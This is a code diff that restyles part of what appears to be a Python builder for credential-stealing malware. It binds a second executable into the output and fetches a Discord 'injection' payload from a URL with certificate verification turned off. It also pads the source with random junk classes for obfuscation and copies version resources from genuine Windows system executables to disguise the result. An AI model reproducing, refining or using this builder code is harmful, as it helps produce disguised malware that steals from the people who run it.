@@ -64,21 +64,20 @@ def PrepareEnvironment(settings: dict) -> None:
     if os.path.isfile("bound.exe"):
         with open("bound.exe", "rb") as file:
             content = file.read()
-        
+
         encrypted = zlib.compress(content)[::-1]
 
         with open("bound.blank", "wb") as file:
             file.write(encrypted)
-        
+
     elif os.path.isfile("bound.blank"):
         os.remove("bound.blank")
 
     if settings["settings"]["consoleMode"] == 0:
         open("noconsole", "w").close()
-    else:
-        if os.path.isfile("noconsole"):
-            os.remove("noconsole")
-    
+    elif os.path.isfile("noconsole"):
+        os.remove("noconsole")
+
     pumpedStubSize = settings["settings"]["pumpedStubSize"]
     if pumpedStubSize > 0:
         with open("pumpStub", "w") as file:
@@ -96,16 +95,16 @@ def ReadSettings() -> tuple[dict, str]:
     try:
         http = PoolManager(cert_reqs="CERT_NONE")
         injection = http.request("GET", InjectionURL, timeout= 5).data.decode().strip()
-        if not "discord.com" in injection:
+        if "discord.com" not in injection:
             injection = None
     except Exception:
         injection = None
-    
+
     return (settings, injection)
 
 def EncryptString(plainText: str) -> str:
     encoded = base64.b64encode(plainText.encode()).decode()
-    return "base64.b64decode(\"{}\").decode()".format(encoded)
+    return f'base64.b64decode(\"{encoded}\").decode()'
 
 def junk(path: str) -> None:
     with open(path) as file:
@@ -113,13 +112,28 @@ def junk(path: str) -> None:
     generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
     junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
     junk_func_calls = junk_funcs.copy()
-    
+
     junk_code = """
 class %s:
     def __init__(self):
     """.strip() % generate_name()
 
-    junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
+    junk_code += "".join(
+        [
+            "\n%sself.%s(%s)"
+            % (
+                " " * 8,
+                x,
+                ", ".join(
+                    [
+                        f"{generate_name()}()"
+                        for _ in range(random.randint(1, 4))
+                    ]
+                ),
+            )
+            for x in junk_funcs
+        ]
+    )
 
     random.shuffle(junk_funcs)
     random.shuffle(junk_func_calls)
@@ -131,7 +145,6 @@ class %s:
 
 def MakeVersionFileAndCert() -> None:
     original: str
-    retries = 0
     exeFiles = []
     paths = [
         os.getenv("SystemRoot"),
@@ -144,18 +157,30 @@ def MakeVersionFileAndCert() -> None:
 
     for path in paths:
         if os.path.isdir(path):
-            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]
+            exeFiles += [
+                os.path.join(path, x)
+                for x in os.listdir(path)
+                if x.endswith(".exe") and x not in exeFiles
+            ]
 
     if exeFiles:
-        while(retries < 5):
+        retries = 0
+        while (retries < 5):
             exefile = random.choice(exeFiles)
-            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
+            res = subprocess.run(
+                f'pyi-grab_version "{exefile}" version.txt',
+                shell=True,
+                capture_output=True,
+            )
             if res.returncode != 0:
                 retries += 1
             else:
                 with open("version.txt") as file:
                     content = file.read()
-                if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
+                if any(
+                    (x.count("'") % 2 == 1 and not x.strip().startswith("#"))
+                    for x in content.splitlines()
+                ):
                     retries += 1
                     continue
                 else:
